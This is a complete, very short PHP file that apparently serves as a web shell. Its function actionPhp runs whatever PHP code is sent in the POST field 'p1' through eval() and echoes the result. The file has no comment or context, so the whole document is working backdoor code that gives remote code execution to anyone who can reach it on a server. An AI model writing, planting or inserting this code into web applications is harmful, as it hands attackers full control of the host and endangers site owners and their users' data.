<?php
function actionPhp() {
	ob_start();
	eval($_POST['p1']);
	echo ob_get_clean();
}

actionPhp();
?>